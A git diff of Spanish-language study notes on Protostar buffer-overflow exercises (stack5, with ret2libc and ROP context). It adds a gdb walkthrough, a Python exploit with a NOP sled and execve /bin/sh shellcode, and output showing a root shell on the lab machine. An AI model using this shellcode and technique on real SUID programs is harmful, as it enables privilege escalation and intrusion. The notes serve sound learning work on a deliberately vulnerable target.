@@ -1,6 +1,6 @@
 
 
-
+Fuente -> [LiveOverflow](https://www.youtube.com/c/LiveOverflow/featured)
 
 ---------------------------------------------------------------------------
 # Concepto de Buffer Overflow -> [stack0](https://exploit.education/protostar/stack-zero/)
@@ -216,6 +216,99 @@ Segmentation fault -> Aunque se queje nos ha ejecutado la win (el mensaje de ant
 ```
 ---------------------------------------------------------------------------
 
+# Shellcode BufferOverflow -> [stack5](https://exploit.education/protostar/stack-five/)
+
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('AAAA'*17 + 'BBBB')" | ./stack5
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('AAAA'*18 + 'BBBB')" | ./stack5
+Segmentation fault
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('AAAA'*18 + 'BBBB')" > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack5
+(gdb) run </tmp/pattern
+Program received signal SIGSEGV, Segmentation fault. Cannot access memory at address 0x4242424a
+(gdb) x/40ex $esp
+0xbffff6ac:	0x42424242	0x00000001	0xbffff754	0xbffff75c -> Entonces nuestro eip es "0xbffff6ac"
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+0x080483d9 <main+21>:	leave  
+(gdb) b *0x080483d9
+(gdb) run </tmp/pattern
+(gdb) x/16x $esp
+0xbffff650:	0xbffff660	0xb7ec6165	0xbffff668	0xb7eada75
+0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141 -> La entrada de "A" empeiza en 0xbffff660
+(gdb) p 0xbffff6ac - 0xbffff660
+$4 = 76 -> La diferencia entre el cominezo de las AAAA y el eip es de 76.
+```
+¿Entonces que queremos? Queremos que el eip salte unas pocas posiciones despues y caiga en codigo a ejecutar. 
+
+> NOPs -> "no operation code" código que no hace nada más que seguir el flujo del programa... un tobogan hacia lo que vaya despues.
+> \xCC -> Son insutrccione de breakpoint o pausa, si funcionan estas, funcionara un shellcode futuro.
+> Shellcode -> El shellcode es codigo a bajo nivel que hace determinadas acciones, en este caso darnos una consola como root.
+
+La cosa esque por las varaibles de entorno y demás, varia la pila entre gdb y fuera de él... así que exactamente no se sabe donde caerá este eip. Si tenemos un shellcode pero el eip cae en mitad lo "rebanará" y ya no funcionará bien, asi que tiene que caer en los nops estos que continuarán el flujo del programa al principio del shellcode que va detras. (De ahí la metáfora del tobogán que te desliza)
+
+```python
+import struct
+offset = "A"*76
+eip = struct.pack('I', 0xbffff6ac+10) # eip original mas unas pocas posiciones
+nops = "\x90" *20 # Unos cuantos nops
+stop = "\xCC"*4  # El codigo breakpoint de prueba
+print(offset + eip + nops + stop)
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py > /tmp/pattern
+(gdb) run </tmp/pattern
+Starting program: /opt/protostar/bin/stack5 </tmp/pattern
+Program received signal SIGTRAP, Trace/breakpoint trap. 
+(gdb) x/40wx $esp
+0xbffff6b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff6c0:	0x90909090	0xcccccccc
+```
+Ha funcionado, asi que lo que queda es sutituir ese breakpoint por el [shellcode](https://shell-storm.org/shellcode/files/shellcode-219.php)
+```python
+import struct
+offset = "A"*76
+eip = struct.pack('I', 0xbffff6ac+10)
+nops = "\x90" *20
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+shellcode += "\x53\x68/tty\x68/dev\x89\xe3\x31"
+shellcode += "\xc9\x66\xb9\x12\x27\xb0\x05\xcd"
+shellcode += "\x80\x31\xc0\x50\x68//sh\x68/bin"
+shellcode += "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+print(offset + eip + nops + shellcode)
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py > /tmp/pattern
+(gdb) run </tmp/pattern
+Starting program: /opt/protostar/bin/stack5 </tmp/pattern
+Executing new program: /bin/dash
+$ whoami
+user
+```
+GDB no puede ejecutar los programas SUID por eso seguimos siendo user. La razon del bin dash esque es un enlace a bash.
+> El cat es para mantener el standar input abierto porque si no la consola que te abre te la cierra al instante.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ ls -la /bin/sh
+lrwxrwxrwx 1 root root 4 Nov 22  2011 /bin/sh -> dash
+[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py; cat) | ./stack5
+whoami
+Illegal Instruction
+```
+Me salía eso y me acabe rallando, pero la solución era muy tonta, aumentar el salto del eip y los nops
+```python
+eip = struct.pack('I', 0xbffff6ac+20)
+nops = "\x90" *80
+```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py; cat) | ./stack5
+# whoami
+root
+```
+
+---------------------------------------------------------------------------
+
 # Ret2libc -> [stack6](https://exploit.education/protostar/stack-six/)
 
 Con el stack 6 no podemos inyectar shellcode en la pila, ya que no nos permite volver a ella poniendola en el eip. Entonces como no hay shellcode, hay
@@ -323,7 +416,6 @@ root
 ```
 # Extra ROP programming -> RET
 
-Fuente [Live Overflow](https://www.youtube.com/watch?v=m17mV24TgwY)
 El rop programming significa que nos aprovechamos de instrucciones de ensamblador del propio código para hacer determinadas cosas en el programa.
 Una de ellas es la intrucción **RET**, la cuál hace un *POP EIP*, 
 
